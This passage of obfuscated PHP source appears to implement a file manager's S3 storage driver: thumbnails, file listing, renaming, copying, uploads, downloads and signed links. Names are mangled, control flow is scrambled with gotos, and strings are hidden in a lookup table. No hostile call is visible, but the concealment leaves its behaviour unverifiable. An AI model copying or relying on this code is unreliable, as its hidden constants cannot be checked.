$this->{$d—ÖåÄ­»}($a¡ïŸ–†ó÷); goto dŞ ö‹‹È¹; B»‡×†‡¦¼: } public function fileOutImage($Dšºá•øËÙ, $DÚÁÖÈĞœ = 250) { goto dÃ®¯‰¨®; dÃ®¯‰¨®: $B“ËÊ»½³­ =& $_SERVER[¯Ò¬Èè]; if (substr($Dšºá•øËÙ, 0, 4) == $B“ËÊ»½³­[144]) { $this->fileOutLink($Dšºá•øËÙ); } $Eí£ãï“¥² = $this->info($Dšºá•øËÙ); goto dë’˜Õ×Ö«; dë’˜Õ×Ö«: if ($Eí£ãï“¥²[$B“ËÊ»½³­[77]] <= 1024 * 50 || !function_exists($B“ËÊ»½³­[159]) || $Eí£ãï“¥²[$B“ËÊ»½³­[160]] == $B“ËÊ»½³­[161]) { return $this->fileOut($Dšºá•øËÙ); } if (isset($Eí£ãï“¥²[$B“ËÊ»½³­[162]][$B“ËÊ»½³­[163]])) { $D¬…ÛÒ» = $Eí£ãï“¥²[$B“ËÊ»½³­[162]][$B“ËÊ»½³­[163]]; } else { if (isset($Eí£ãï“¥²[$B“ËÊ»½³­[162]][$B“ËÊ»½³­[164]])) { $D¬…ÛÒ» = $Eí£ãï“¥²[$B“ËÊ»½³­[162]][$B“ËÊ»½³­[164]]; } else { $D¬…ÛÒ» = md5("{$Eí£ãï“¥²[$B“ËÊ»½³­[28]]}\x5f{$Eí£ãï“¥²[$B“ËÊ»½³­[75]]}\x5f{$Eí£ãï“¥²[$B“ËÊ»½³­[77]]}"); } } $dˆÕ„¨¢› = "{$D¬…ÛÒ»}\x5f{$DÚÁÖÈĞœ}\x2e\x70\x6e\x67"; goto Då§»Æİ±; aó´Ş¼Š‚…: $a‘àŒ®† = DATA_THUMB . $dˆÕ„¨¢›; if (!@file_exists($a‘àŒ®†)) { $d·µ¦öàâõ = TEMP_FILES; if (!is_dir($d·µ¦öàâõ)) { mk_dir($d·µ¦öàâõ); } $E‡ªÉ¾ë³ = $d·µ¦öàâõ . $D¬…ÛÒ» . $B“ËÊ»½³­[91] . $Eí£ãï“¥²[$B“ËÊ»½³­[160]]; if (!@file_exists($E‡ªÉ¾ë³)) { $E‡ªÉ¾ë³ = $this->download($Dšºá•øËÙ, $E‡ªÉ¾ë³); } $EÜ™÷Ôà = new ImageThumb($E‡ªÉ¾ë³, $B“ËÊ»½³­[167]); $EÜ™÷Ôà->prorate($a‘àŒ®†, $DÚÁÖÈĞœ, $DÚÁÖÈĞœ * 10); } if (!file_exists($a‘àŒ®†) || filesize($a‘àŒ®†) < 100) { return @file_exists($E‡ªÉ¾ë³) ? IO::fileOut($E‡ªÉ¾ë³) : $this->fileOut($Dšºá•øËÙ); } goto dêÅÓ¡Åºå; Då§»Æİ±: if (!($e˜åµç¨˜ñ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B“ËÊ»½³­[165]))) { $FéøìÅ¸¯ö = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B“ËÊ»½³­[166]); } else { $FéøìÅ¸¯ö = KodIO::make($e˜åµç¨˜ñ); } if ($e˜åµç¨˜ñ = IO::fileNameExist($FéøìÅ¸¯ö, $dˆÕ„¨¢›)) { $a‘àŒ®† = KodIO::make($e˜åµç¨˜ñ); return IO::fileOut($a‘àŒ®†); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto aó´Ş¼Š‚…; dêÅÓ¡Åºå: if (!($DŒõ’Í¯åº = IO::move($a‘àŒ®†, $FéøìÅ¸¯ö))) { return IO::fileOut($a‘àŒ®†); } del_file($a‘àŒ®†); IO::fileOut($DŒõ’Í¯åº); goto e©ƒµùÖ»Ñ; e©ƒµùÖ»Ñ: } public function fileOutImageServer($cª´†¥Š•å, $b·–ìØÍâİ = 250) { $this->fileOutImage($cª´†¥Š•å, $b·–ìØÍâİ); } public function fileNameAuto($a°¡ßÑ¯öÒ, $BÛ…µ˜à¢, $fİªæˆÔàÎ = REPEAT_RENAME, $DâØ§‚š˜® = false) { goto bùéŸÃ¯×Ò; b«µµõó£‰: while ($this->exist(rtrim($a°¡ßÑ¯öÒ, $b¨Şá«èÎ[8]) . $b¨Şá«èÎ[8] . $a½¹“«)) { $a½¹“« = $FÙØÉ¨„˜Ö . "\50{$dÚ‚°œˆ£”}\51{$aÍÅ¤§š§Ó}"; $dÚ‚°œˆ£”++; } return $a½¹“«; goto e˜Ö­‚œ´; bùéŸÃ¯×Ò: $b¨Şá«èÎ =& $_SERVER[¯Ò¬Èè]; $E®‰îÜ¬ = $a°¡ßÑ¯öÒ === $b¨Şá«èÎ[33] ? $BÛ…µ˜à¢ : rtrim($a°¡ßÑ¯öÒ, $b¨Şá«èÎ[8]) . $b¨Şá«èÎ[8] . $BÛ…µ˜à¢; if ($fİªæˆÔàÎ == REPEAT_REPLACE || !$this->exist($E®‰îÜ¬) || $DâØ§‚š˜® && $fİªæˆÔàÎ != REPEAT_RENAME_FOLDER) { return $BÛ…µ˜à¢; } goto F„è‹Ë…¦; eêö™¢ÉÄù: $dÚ‚°œˆ£” = 1; $FÙØÉ¨„˜Ö = substr($BÛ…µ˜à¢, 0, strlen($BÛ…µ˜à¢) - strlen($aÍÅ¤§š§Ó)); $a½¹“« = $FÙØÉ¨„˜Ö . "\x28{$dÚ‚°œˆ£”}\x29{$aÍÅ¤§š§Ó}"; goto b«µµõó£‰; F„è‹Ë…¦: if ($fİªæˆÔàÎ == REPEAT_SKIP) { return !1; } $aÍÅ¤§š§Ó = $b¨Şá«èÎ[91] . get_path_ext($BÛ…µ˜à¢); $aÍÅ¤§š§Ó = $aÍÅ¤§š§Ó == $b¨Şá«èÎ[91] || $DâØ§‚š˜® ? $b¨Şá«èÎ[33] : $aÍÅ¤§š§Ó; goto eêö™¢ÉÄù; e˜Ö­‚œ´: } public function listAllFiles($C Šï£²©‡, $aÛİ“Ñ’¶á, $bÑĞ×†ÖŒ = array()) { goto cÎ‰ò¯•Î˜; cÎ‰ò¯•Î˜: $A°ÉÒìÑ¸’ =& $_SERVER[¯Ò¬Èè]; if (empty($aÛİ“Ñ’¶á)) { return array(); } $CëİñÛ¼ = array(); goto C‘÷åíÜÇ; bÛ½ò¶Ôò¥: foreach (array_unique($CëİñÛ¼) as $eÁÊ½ÄÌ”) { $aÜÙáÀÊï„ = array($A°ÉÒìÑ¸’[75] => $this->getPathOuter($A°ÉÒìÑ¸’[8] . $C Šï£²©‡ . $A°ÉÒìÑ¸’[8] . $eÁÊ½ÄÌ”), $A°ÉÒìÑ¸’[76] => 1, $A°ÉÒìÑ¸’[77] => 0); if (substr($eÁÊ½ÄÌ”, -1) != $A°ÉÒìÑ¸’[8]) { $aÜÙáÀÊï„[$A°ÉÒìÑ¸’[76]] = 0; $B«ÛòîÑö§ = $this->getPath($C Šï£²©‡ . $A°ÉÒìÑ¸’[8] . $eÁÊ½ÄÌ”); $aÜÙáÀÊï„[$A°ÉÒìÑ¸’[77]] = isset($bÑĞ×†ÖŒ[$B«ÛòîÑö§]) ? $bÑĞ×†ÖŒ[$B«ÛòîÑö§] : $this->size($B«ÛòîÑö§); } $d¸õæĞç¢[] = $aÜÙáÀÊï„; } return $d¸õæĞç¢; goto EĞò¶ÂÕ¨Æ; C‘÷åíÜÇ: $C Šï£²©‡ = trim($C Šï£²©‡, $A°ÉÒìÑ¸’[8]); foreach ($aÛİ“Ñ’¶á as $eÁÊ½ÄÌ”) { $B¾Öâ¼ƒ² = ltrim(substr($eÁÊ½ÄÌ”, strlen($C Šï£²©‡)), $A°ÉÒìÑ¸’[8]); $CëİñÛ¼ = array_merge($CëİñÛ¼, $this->slicePath($B¾Öâ¼ƒ²)); } $d¸õæĞç¢ = array(); goto bÛ½ò¶Ôò¥; EĞò¶ÂÕ¨Æ: } public function slicePath($cÆ¸‰‚–×Ü) { $e‹Ï‹èìßÁ =& $_SERVER[¯Ò¬Èè]; $D–—ÖñÏ = explode($e‹Ï‹èìßÁ[8], trim($cÆ¸‰‚–×Ü, $e‹Ï‹èìßÁ[8])); $C„©»Œô‡ = 0; do { ++$C„©»Œô‡; $C¼Í«…œ[] = implode($e‹Ï‹èìßÁ[8], array_slice($D–—ÖñÏ, 0, $C„©»Œô‡)) . $e‹Ï‹èìßÁ[8]; } while ($C„©»Œô‡ < count($D–—ÖñÏ)); $C¼Í«…œ[count($D–—ÖñÏ) - 1] = $cÆ¸‰‚–×Ü; return $C¼Í«…œ; } public function getHost() { $fÈë†Èº¨Ó =& $_SERVER[¯Ò¬Èè]; $D«‹°•“˜ = parse_url(trim($this->domain, $fÈë†Èº¨Ó[8])); $eİ±³á—ßÊ = isset($D«‹°•“˜[$fÈë†Èº¨Ó[168]]) ? $D«‹°•“˜[$fÈë†Èº¨Ó[168]] : http_type(); $dªÚÎ˜ó‡ = isset($D«‹°•“˜[$fÈë†Èº¨Ó[169]]) ? $D«‹°•“˜[$fÈë†Èº¨Ó[169]] : $D«‹°•“˜[$fÈë†Èº¨Ó[75]]; if (isset($D«‹°•“˜[$fÈë†Èº¨Ó[170]])) { $dªÚÎ˜ó‡ .= $fÈë†Èº¨Ó[4] . $D«‹°•“˜[$fÈë†Èº¨Ó[170]]; } return $eİ±³á—ßÊ . $fÈë†Èº¨Ó[171] . $dªÚÎ˜ó‡; } public function pathEncode($b²½é‹èÈ) { $D‰ã‹›èÆœ =& $_SERVER[¯Ò¬Èè]; return str_replace($D‰ã‹›èÆœ[172], $D‰ã‹›èÆœ[8], rawurlencode($b²½é‹èÈ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($FšÀÂéŠ”ó) { set_timeout(); require_once SDK_DIR . $_SERVER[¯Ò¬Èè][173]; parent::__construct(); $this->_init($FšÀÂéŠ”ó); } public function _init($fÍöŒ¤ÊÒÛ) { foreach ($fÍöŒ¤ÊÒÛ as $aÆŸ”¥‚‚ => $AàÊè—Ù¢±) { if (isset($this->{$aÆŸ”¥‚‚})) { $this->{$aÆŸ”¥‚‚} = $AàÊè—Ù¢±; } } $this->endpoint = $fÍöŒ¤ÊÒÛ[$_SERVER[¯Ò¬Èè][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($EÎõ¨ä’ƒ¥ = "\x76\x34") { $this->signVer = $EÎõ¨ä’ƒ¥; $this->client->setSignatureVersion($EÎõ¨ä’ƒ¥); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto FÚ½’ÃÁ—; FÚ½’ÃÁ—: $bØÙÎÖ¹®Œ =& $_SERVER[¯Ò¬Èè]; $B‚‘¶Í–³ = $this->getBucketCors(); if (!$B‚‘¶Í–³ || !is_array($B‚‘¶Í–³)) { return !1; } goto a¢Çù°¤…; d¶¾Ÿ¼ğô: $e¿¦¥ õÛ = array($bØÙÎÖ¹®Œ[180], $bØÙÎÖ¹®Œ[181], $bØÙÎÖ¹®Œ[182], $bØÙÎÖ¹®Œ[183], $bØÙÎÖ¹®Œ[184]); $båŠ—í“… = array_diff($e¿¦¥ õÛ, $fØÏ÷‚î˜ª); return empty($båŠ—í“…); goto cÀ¨–‹­îŞ; a¢Çù°¤…: if ($B‚‘¶Í–³[$bØÙÎÖ¹®Œ[175]] != $bØÙÎÖ¹®Œ[176] || $B‚‘¶Í–³[$bØÙÎÖ¹®Œ[177]] != $bØÙÎÖ¹®Œ[176]) { return !1; } $fØÏ÷‚î˜ª = array_map($bØÙÎÖ¹®Œ[178], $B‚‘¶Í–³[$bØÙÎÖ¹®Œ[179]]); if (!is_array($fØÏ÷‚î˜ª)) { $fØÏ÷‚î˜ª = array(); } goto d¶¾Ÿ¼ğô; cÀ¨–‹­îŞ: } public function mkfile($C¬¸ÀÀÉ, $Cî¤êÌ¸¡Å = '', $A¤¹ñÕã‘ = REPEAT_RENAME) { $E’‹¥¼‹à™ = $this->setContent($C¬¸ÀÀÉ, $Cî¤êÌ¸¡Å); if ($E’‹¥¼‹à™ !== !1) { return $this->getPathOuter($C¬¸ÀÀÉ); } return !1; } public function mkdir($EŠƒİãÌóØ, $F¿”™·ğŞ = REPEAT_SKIP) { if (empty($EŠƒİãÌóØ)) { return !1; } if ($this->_isFolder($EŠƒİãÌóØ)) { return $this->getPathOuter($EŠƒİãÌóØ); } $fœ¬¤«¢ = $this->setContent($EŠƒİãÌóØ, $_SERVER[¯Ò¬Èè][33], !0); if ($fœ¬¤«¢ !== !1) { return $this->getPathOuter($EŠƒİãÌóØ); } return !1; } public function copyFile($bá³ÉÉ¦Ï, $eîµë‘÷ğ•, $a©š½ç¡¦ˆ = array()) { $F±ó²‘”Œ =& $_SERVER[¯Ò¬Èè]; $F“³ŠÊ‘ÊÀ = $this->objectMeta($bá³ÉÉ¦Ï); if (!$F“³ŠÊ‘ÊÀ) { return !1; } if ($F“³ŠÊ‘ÊÀ[$F±ó²‘”Œ[77]] <= 1024 * 1024 * 200) { $cØêÍÒçæ = $this->client->copyObject($this->bucket, $bá³ÉÉ¦Ï, $this->bucket, $eîµë‘÷ğ•, $F±ó²‘”Œ[185], $a©š½ç¡¦ˆ); } else { $cØêÍÒçæ = $this->client->multiCopyObject($this->bucket, $bá³ÉÉ¦Ï, $this->bucket, $eîµë‘÷ğ•, $a©š½ç¡¦ˆ); } $cØêÍÒçæ = $cØêÍÒçæ ? $this->getPathOuter($eîµë‘÷ğ•) : !1; return $cØêÍÒçæ; } public function moveFile($fØ¦¢ÂÆÕ, $FÆ¼ßºôï) { if ($this->copyFile($fØ¦¢ÂÆÕ, $FÆ¼ßºôï)) { $this->delFile($fØ¦¢ÂÆÕ); return $this->getPathOuter($FÆ¼ßºôï); } return !1; } public function delFile($aŸï‰óÚ®Ä) { return $this->client->deleteObject($this->bucket, $aŸï‰óÚ®Ä); } public function delFolder($c¬…‘‹µğ‚) { goto c¥™Úï±»°; Cš‘­¥ÌÙ»: $eŠ®‰‹áãä = $d¿°´¶Ì­ = 0; $a„ßÄÒ¹©ğ = array_chunk(array_keys($FÕ²·è—), 1000); foreach ($a„ßÄÒ¹©ğ as $B–‡š‚§¾) { $eŠ®‰‹áãä++; $d¿°´¶Ì­ += (int) $this->client->deleteObjects($this->bucket, $B–‡š‚§¾); } goto EŠßÏ¥¨·š; EŠßÏ¥¨·š: return $eŠ®‰‹áãä === $d¿°´¶Ì­ ? !0 : !1; goto C†‚òÔ÷­; c¥™Úï±»°: $f„¼»¹ß¡¬ =& $_SERVER[¯Ò¬Èè]; $FÕ²·è— = $this->listObjs($c¬…‘‹µğ‚); if (!$FÕ²·è—) { $c¬…‘‹µğ‚ = trim($c¬…‘‹µğ‚, $f„¼»¹ß¡¬[8]); if (!empty($c¬…‘‹µğ‚)) { $c¬…‘‹µğ‚ .= $f„¼»¹ß¡¬[8]; } return $this->delFile($c¬…‘‹µğ‚); } goto Cš‘­¥ÌÙ»; C†‚òÔ÷­: } public function rename($f¢øëˆÒ…, $DîŒ†íŸø) { return $this->renameObject($f¢øëˆÒ…, $DîŒ†íŸø); } public function listPath($F‹é×Á› , $e¬õŸò¸§› = false) { $AŠÍĞğèÙ =& $_SERVER[¯Ò¬Èè]; $fÈ§¦ÂƒÙØ = $this->listObjs($F‹é×Á› , null, null, $AŠÍĞğèÙ[8]); $f©ª„ïç¸É = array($AŠÍĞğèÙ[74] => array(), $AŠÍĞğèÙ[73] => array()); foreach ($fÈ§¦ÂƒÙØ as $A±†çêä« => $FÌù§£âÛÂ) { if ($A±†çêä« == $AŠÍĞğèÙ[8]) { continue; } if (isset($FÌù§£âÛÂ[$AŠÍĞğèÙ[186]])) { $f©ª„ïç¸É[$AŠÍĞğèÙ[74]][] = $this->folderInfo($FÌù§£âÛÂ[$AŠÍĞğèÙ[186]], $e¬õŸò¸§›); } else { if (substr($FÌù§£âÛÂ[$AŠÍĞğèÙ[28]], -1) == $AŠÍĞğèÙ[8]) { continue; } $f©ª„ïç¸É[$AŠÍĞğèÙ[73]][] = $this->fileInfo($FÌù§£âÛÂ[$AŠÍĞğèÙ[28]], $e¬õŸò¸§›, $FÌù§£âÛÂ); } } return $f©ª„ïç¸É; } private function fileInfo($eôŒåØ¿†ù, $C¹Ş¶ÄæÁ = false, $d¤›™ ¹ñø = array()) { goto aãÒ²î’‘; b‘‹¢—ˆ®»: return $cÌ£çˆõ¶‹; goto BáİÔ«ë»Ô; aãÒ²î’‘: $A¼ÀøİñÎñ =& $_SERVER[¯Ò¬Èè]; if ($C¹Ş¶ÄæÁ) { return array($A¼ÀøİñÎñ[28] => $this->pathThis($eôŒåØ¿†ù), $A¼ÀøİñÎñ[75] => $this->getPathOuter($eôŒåØ¿†ù), $A¼ÀøİñÎñ[29] => $A¼ÀøİñÎñ[167], $A¼ÀøİñÎñ[160] => $this->ext($eôŒåØ¿†ù), $A¼ÀøİñÎñ[77] => isset($d¤›™ ¹ñø[$A¼ÀøİñÎñ[77]]) ? $d¤›™ ¹ñø[$A¼ÀøİñÎñ[77]] : 0, $A¼ÀøİñÎñ[187] => 0, $A¼ÀøİñÎñ[107] => 0, $A¼ÀøİñÎñ[188] => !0, $A¼ÀøİñÎñ[189] => !0); } $cÌ£çˆõ¶‹ = array($A¼ÀøİñÎñ[28] => $this->pathThis($eôŒåØ¿†ù), $A¼ÀøİñÎñ[75] => $this->getPathOuter($eôŒåØ¿†ù), $A¼ÀøİñÎñ[29] => $A¼ÀøİñÎñ[167], $A¼ÀøİñÎñ[187] => 0, $A¼ÀøİñÎñ[107] => 0, $A¼ÀøİñÎñ[77] => 0, $A¼ÀøİñÎñ[160] => $this->ext($eôŒåØ¿†ù), $A¼ÀøİñÎñ[188] => !0, $A¼ÀøİñÎñ[189] => !0); goto dô„˜‹ã¦§; dô„˜‹ã¦§: if (empty($d¤›™ ¹ñø)) { $d¤›™ ¹ñø = $this->objectMeta($eôŒåØ¿†ù); if (!$d¤›™ ¹ñø) { return $cÌ£çˆõ¶‹; } } if (isset($d¤›™ ¹ñø[$A¼ÀøİñÎñ[190]])) { $cÌ£çˆõ¶‹[$A¼ÀøİñÎñ[107]] = $d¤›™ ¹ñø[$A¼ÀøİñÎñ[190]]; } if (isset($d¤›™ ¹ñø[$A¼ÀøİñÎñ[77]])) { $cÌ£çˆõ¶‹[$A¼ÀøİñÎñ[77]] = $d¤›™ ¹ñø[$A¼ÀøİñÎñ[77]]; } goto b‘‹¢—ˆ®»; BáİÔ«ë»Ô: } private function folderInfo($CÏŞ”ÕÃ¡, $C÷Ã‘ä‚ª = false) { goto bÖƒ³Š·œò; bÖƒ³Š·œò: $F¸åèõá± =& $_SERVER[¯Ò¬Èè]; if ($C÷Ã‘ä‚ª) { return array($F¸åèõá±[28] => $this->pathThis($CÏŞ”ÕÃ¡), $F¸åèõá±[75] => $this->getPathOuter($F¸åèõá±[8] . $CÏŞ”ÕÃ¡), $F¸åèõá±[29] => $F¸åèõá±[76], $F¸åèõá±[188] => !0, $F¸åèõá±[189] => !0); } $B‚†İÅó¶ñ = array($F¸åèõá±[28] => $this->pathThis($CÏŞ”ÕÃ¡), $F¸åèõá±[75] => $this->getPathOuter($F¸åèõá±[8] . $CÏŞ”ÕÃ¡), $F¸åèõá±[29] => $F¸åèõá±[76], $F¸åèõá±[187] => 0, $F¸åèõá±[107] => 0, $F¸åèõá±[188] => !0, $F¸åèõá±[189] => !0); goto dÍ°”‰Í…”; d„šôÑ‡ˆò: if (isset($e°‚™éµ›õ[$F¸åèõá±[190]])) { $B‚†İÅó¶ñ[$F¸åèõá±[187]] = $e°‚™éµ›õ[$F¸åèõá±[190]]; } return $B‚†İÅó¶ñ; goto eªÇÔÔÕµ—; dÍ°”‰Í…”: if ($CÏŞ”ÕÃ¡ == $F¸åèõá±[33]) { return $B‚†İÅó¶ñ; } $CÏŞ”ÕÃ¡ = trim($CÏŞ”ÕÃ¡, $F¸åèõá±[8]) . $F¸åèõá±[8]; $e°‚™éµ›õ = $this->objectMeta($CÏŞ”ÕÃ¡); goto d„šôÑ‡ˆò; eªÇÔÔÕµ—: } public function listObjs($Eï¦ƒÚà³Õ, $D´ÈŠœƒè… = null, $E—“ˆ¯±¦ = null, $dÕµ¥õÛ = null) { $Fßô©Í¬È =& $_SERVER[¯Ò¬Èè]; $Eï¦ƒÚà³Õ = trim($Eï¦ƒÚà³Õ, $Fßô©Í¬È[8]); $b·Ãƒ¦Áâ¹ = empty($Eï¦ƒÚà³Õ) ? $Fßô©Í¬È[33] : $Eï¦ƒÚà³Õ . $Fßô©Í¬È[8]; return $this->client->getBucket($this->bucket, $b·Ãƒ¦Áâ¹, $D´ÈŠœƒè…, $E—“ˆ¯±¦, $dÕµ¥õÛ, !0); } public function has($aÁ¤Ôà¿êë, $FìÕô¢­ô = false, $dÄÂÔŠ°œ = true) { goto aÍÓ¨ê†Ê›; e«Â¯œœ®: $D°İ‹‰½¨ù = $this->listObjs($aÁ¤Ôà¿êë, null, null, $e§²â‹Œ[8]); $D°İ‹‰½¨ù = is_array($D°İ‹‰½¨ù) ? $D°İ‹‰½¨ù : array(); foreach ($D°İ‹‰½¨ù as $B½Ö“×Œ) { if (isset($B½Ö“×Œ[$e§²â‹Œ[28]]) && substr($B½Ö“×Œ[$e§²â‹Œ[28]], -1) != $e§²â‹Œ[8]) { if (!$FìÕô¢­ô && $dÄÂÔŠ°œ) { return !0; } $aèÒƒ°È++; } else { if (isset($B½Ö“×Œ[$e§²â‹Œ[186]])) { if (!$FìÕô¢­ô && !$dÄÂÔŠ°œ) { return !1; } $C”Æ­«ÍÉÏ++; } } } goto bò”„åò¶; bò”„åò¶: if ($FìÕô¢­ô) { return array($e§²â‹Œ[191] => $aèÒƒ°È, $e§²â‹Œ[192] => $C”Æ­«ÍÉÏ); } return !1; goto dà…ˆº²äÖ; aÍÓ¨ê†Ê›: $e§²â‹Œ =& $_SERVER[¯Ò¬Èè]; $aèÒƒ°È = 0; $C”Æ­«ÍÉÏ = 0; goto e«Â¯œœ®; dà…ˆº²äÖ: } public function listAll($D¸Á¼ÓçÂì) { $DÉòˆöéŠ¸ =& $_SERVER[¯Ò¬Èè]; $EÅÀÑæˆªè = $this->listObjs($D¸Á¼ÓçÂì); $E¢—Ç®Õ­¬ = $c‚»Ñô‚Ó¤ = array(); foreach ($EÅÀÑæˆªè as $A•²¾¼¯Ñ¯ => $B¯ˆë•Ú‚) { $E¢—Ç®Õ­¬[] = $B¯ˆë•Ú‚[$DÉòˆöéŠ¸[28]]; $c‚»Ñô‚Ó¤[$A•²¾¼¯Ñ¯] = $B¯ˆë•Ú‚[$DÉòˆöéŠ¸[77]]; } return $this->listAllFiles($D¸Á¼ÓçÂì, $E¢—Ç®Õ­¬, $c‚»Ñô‚Ó¤); } public function canRead($E½£Á›®¡¨) { $c¯—Šİ·Áë =& $_SERVER[¯Ò¬Èè]; $d¼ƒáÁÂ” = $this->client->getAccessControlPolicy($this->bucket, $E½£Á›®¡¨); if (!$d¼ƒáÁÂ”) { return !1; } return in_array($d¼ƒáÁÂ”, array($c¯—Šİ·Áë[193], $c¯—Šİ·Áë[194], $c¯—Šİ·Áë[195])) ? !0 : !1; } public function canWrite($b‡‚ç®¿Š) { $DáÈƒŞ‰‹­ =& $_SERVER[¯Ò¬Èè]; $EÏáÈ³”ìì = $this->client->getAccessControlPolicy($this->bucket, $b‡‚ç®¿Š); if (!$EÏáÈ³”ìì) { return !1; } return in_array($EÏáÈ³”ìì, array($DáÈƒŞ‰‹­[193], $DáÈƒŞ‰‹­[194])) ? !0 : !1; } public function getContent($E å°Œ£Ş) { return $this->client->getObject($this->bucket, $E å°Œ£Ş); } public function setContent($b‹Á½—´—˜, $CŠÕÚ©è¤ = '', $a¹ïñ‚©‡Ç = false) { goto dÔù¦’†‚²; c§Û¶¹ô: $FÈÌ„İíù = $this->client->putObject($CŠÕÚ©è¤, $this->bucket, $b‹Á½—´—˜, $E±Øâôçï[185], array(), $aĞÑğìÂìğ); if (!$FÈÌ„İíù) { return !1; } if ($a¹ïñ‚©‡Ç) { return !0; } goto A½ñÄ–Â¯¦; dÔù¦’†‚²: $E±Øâôçï =& $_SERVER[¯Ò¬Èè]; $b‹Á½—´—˜ = $a¹ïñ‚©‡Ç ? trim($b‹Á½—´—˜, $E±Øâôçï[8]) . $E±Øâôçï[8] : $b‹Á½—´—˜; $aĞÑğìÂìğ = get_file_mime(get_path_ext($b‹Á½—´—˜)); goto c§Û¶¹ô; A½ñÄ–Â¯¦: $FÈÌ„İíù = $this->copyFile($b‹Á½—´—˜, $b‹Á½—´—˜, array($E±Øâôçï[196] => $FÈÌ„İíù[$E±Øâôçï[197]])); return $FÈÌ„İíù ? !0 : !1; goto C·Îˆ¡›™‹; C·Îˆ¡›™‹: } public function fileSubstr($d®‚ëĞì‚ò, $DòŞ‹š™, $b¸É¦–«¼‰) { $fÒƒ¶ÚÔ³µ = $DòŞ‹š™ + $b¸É¦–«¼‰ - 1; return $this->client->getObject($this->bucket, $d®‚ëĞì‚ò, array($_SERVER[¯Ò¬Èè][198] => "\x62\171\164\145\163\75{$DòŞ‹š™}\x2d{$fÒƒ¶ÚÔ³µ}")); } public function upload($C»Éğ¨ä², $cà…Šµˆª¹, $F·ŠÎ¹µŠÜ = false, $b»çµïéÖ = REPEAT_REPLACE) { $E×‘Îì’Ğß =& $_SERVER[¯Ò¬Èè]; $e¯ôˆÊ¶Ï = array($E×‘Îì’Ğß[196] => @md5_file($cà…Šµˆª¹)); $DÉÓÕäë°‚ = array($E×‘Îì’Ğß[199] => get_file_mime(get_path_ext($C»Éğ¨ä²))); if (IO::size($cà…Šµˆª¹) <= 1024 * 1024 * 200) { $F–«µÕŠ™Ù = $this->client->putObjectFile($cà…Šµˆª¹, $this->bucket, $C»Éğ¨ä², $E×‘Îì’Ğß[185], $e¯ôˆÊ¶Ï, $DÉÓÕäë°‚); return !empty($F–«µÕŠ™Ù) ? $this->getPathOuter($C»Éğ¨ä²) : !1; } $E˜Ï²§„“ê = $this->client->multiUploadObject($cà…Šµˆª¹, $this->bucket, trim($C»Éğ¨ä², $E×‘Îì’Ğß[8]), $e¯ôˆÊ¶Ï, $DÉÓÕäë°‚); return $E˜Ï²§„“ê ? $this->getPathOuter($C»Éğ¨ä²) : !1; } public function download($d‘°»‚´åù, $C—óœ‡õÃ) { if (!@is_dir($this->pathFather($C—óœ‡õÃ)) && !IO::mkdir($this->pathFather($C—óœ‡õÃ))) { return !1; } $a¹İ¤ùÜáà = $this->client->getObject($this->bucket, $d‘°»‚´åù, array(), $C—óœ‡õÃ); return $a¹İ¤ùÜáà !== !1 ? $C—óœ‡õÃ : !1; } public function link($fñÑÑÜßÙ¥, $eñòà¾§Ó = array()) { $AŸ’Í£ò–å =& $_SERVER[¯Ò¬Èè]; if ($this->signVer == $AŸ’Í£ò–å[200]) { return $this->client->getAuthenticatedURL($this->bucket, $fñÑÑÜßÙ¥, 3600 * 12, $eñòà¾§Ó); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($fñÑÑÜßÙ¥, $AŸ’Í£ò–å[8]), 3600 * 12, $this->region, array(), !0, $eñòà¾§Ó); } public function fileOut($FäÁ¢Ü¦Ëö, $E²İ„õğÓ = false, $b‹åÙšº¹² = false, $c‚Û¹ØÔâ = '') { goto d¨Ó½¤×Åˆ; d¨Ó½¤×Åˆ: $D¸Œà£‘‹‚ =& $_SERVER[¯Ò¬Èè]; if (!$b‹åÙšº¹²) { $b‹åÙšº¹² = $this->pathThis($FäÁ¢Ü¦Ëö); } $CÓ¦§ÍŠŒö = get_file_mime(get_path_ext($b‹åÙšº¹²)); goto bÂ£¤´¨ˆŠ; C‘’­Ä´ê: $a™œá°Ñê© = $this->link($FäÁ¢Ü¦Ëö, $bİÔ–Ùó); $this->fileOutLink($a™œá°Ñê©); goto c†­ìæôÈÖ; bÂ£¤´¨ˆŠ: if ($CÓ¦§ÍŠŒö == $D¸Œà£‘‹‚[201]) { return parent::fileOut($FäÁ¢Ü¦Ëö, $E²İ„õğÓ, $b‹åÙšº¹², $c‚Û¹ØÔâ); } $E²İ„õğÓ = $E²İ„õğÓ ? $D¸Œà£‘‹‚[202] : $D¸Œà£‘‹‚[203]; $bİÔ–Ùó = array($D¸Œà£‘‹‚[204] => $E²İ„õğÓ . $D¸Œà£‘‹‚[205] . rawurlencode($b‹åÙšº¹²), $D¸Œà£‘‹‚[206] => $CÓ¦§ÍŠŒö); goto C‘’­Ä´ê; c†­ìæôÈÖ: } public function fileOutServer($d·öÖñ¯Ü¦, $FÚ‚§Î£ÀÈ = false, $eµŞ»Ç»«ë = false, $FÔäÀÈÒ…‚ = '') { parent::fileOut($d·öÖñ¯Ü¦, $FÚ‚§Î£ÀÈ, $eµŞ»Ç»«ë, $FÔäÀÈÒ…‚); } public function fileOutImage($dÏæ©Ïâí‹, $C—Š ²ŸµŒ = 250) { $A±óÆŒÆÊ = $this->link($dÏæ©Ïâí‹); $this->fileOutLink($A±óÆŒÆÊ); } public function fileOutImageServer($Bœ‰·¿ĞÄ—, $bâµÏ«õò = 250) { parent::fileOutImage($Bœ‰·¿ĞÄ—, $bâµÏ«õò); } public function hashMd5($BÉß¦Ç¸ÕÚ, $Aæ©½ß‘å = '') { $b¯ÔÚ£×Ï‡ =& $_SERVER[¯Ò¬Èè]; $f…­ë§™ = $this->objectMeta($BÉß¦Ç¸ÕÚ); if (!$f…­ë§™) { return !1; } $Aæ©½ß‘å = $Aæ©½ß‘å 